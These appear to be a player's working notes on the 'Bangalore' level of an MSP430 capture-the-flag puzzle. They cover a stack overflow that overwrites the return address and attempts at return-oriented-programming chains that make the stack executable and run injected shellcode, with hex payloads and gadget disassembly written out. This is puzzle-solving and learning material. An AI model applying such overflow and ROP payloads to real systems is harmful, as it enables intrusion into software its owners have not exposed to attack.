bangalore:

bytes 17 and 18 (past 16 byte limit) end up in pc

`0102030405060708090a0b0c0d0e0f101112`

`324000ffb0121000aaaaaaaaaaaaaaaaee3f`

* stack is always at 0x4000
* input stored at 0x3fee
* stack is write-only page
* address space appears to be 0x0-0xffff
* 256 pages, so 256 bytes per page

Can we jump to `mark_page_executable` with the stack page as a param?

```
mov <page #> r15
call #0x44b4
```

`0102030405060708090a0b0c0d0e0f10b444f1f2f3f4f5f6f7f8f9fafbfcfdfeff`

`324000ffb0121000aaaaaaaaaaaaaaaab444ee3ff3f4f5f6f7f8f9fafbfcfdfeff`

Probably won't work, learn about [ROP, Return Oriented Programming](https://en.wikipedia.org/wiki/Return-oriented_programming)

pop into register followed by a return to get data?

`0102030405060708090a0b0c007f0f105044131415161718191a1b1c1d1e1f`

Can we make the stack executable by:

```
4508:  3b41           pop	r11
450a:  3041           ret

44f6:  0f4b           mov	r11, r15
44f8:  b012 b444      call	#0x44b4 <mark_page_executable>
```

`0102030405060708090a0b0c0d0e0f1008454000f6441718191a1b1c1d1e1f`

`0102030405060708090a0b0c0d0e0f102645131415161718191a1b1c1d1e12021222324252627282922B2C2D2E2F30`

Use this gadget(1) to mark stack as executable:

```
44ba:  3180 0600      sub	#0x6, sp
44be:  3240 0091      mov	#0x9100, sr
44c2:  b012 1000      call	#0x10
44c6:  3150 0a00      add	#0xa, sp
44ca:  3041           ret
```

This moves the stack pointer by 6 bytes, marks page pointed to by sp as executable. This is close, but returning from the call #0x10 writes to the stack, which causes segfault

```
0102030405060708090a0b0c0d0e0f10ba4440000000aaaa324000ffb0121000

0x3fee (page 0x3f)                  0x4000 (page 0x40)
|                                   |
v                                   v
324000ffb012100003430b0c0d0e0f10ba443f000000ee3f
^                               ^   ^   ^   ^
|                               |   |   |   |
This is the code we want to     |   |   |   sp points here after the executable change, making it the return address. We'll jump to our code (5)
execute:                        |   |   0x0 is param for mark page as executable
mov #0xff, sr					|   sp points here after jump to gadget(1), which is the page # (0x3f) to be marked executable
call #0x10						sp will be here, ret addr for gadget(1)
```

Could try ROPing to this gadget(2):

```
4526:  3e40 3000      mov	#0x30, r14
452a:  0f41           mov	sp, r15
452c:  b012 6244      call	#0x4462 <getsn> ; call getsn to read max 48 bytes to sp
4530:  3f40 6524      mov	#0x2465, r15
4534:  b012 7a44      call	#0x447a <puts>
4538:  3150 1000      add	#0x10, sp
453c:  3041           ret
```

This moves the stack pointer 16 bytes and prompts for input again. Could we call this 16 times in order to to leave code in one page while stack pointer gets moved to another page? Then we call gadget(1) to mark the page we left the code in as executable, and then call that code we left in the now executable page.

```
0102030405060708090a0b0c0d0e0f10264540000000bbbb324000ffb0121000
                                ^^^^
                                sp will be here, ret addr for gadget(2)
```
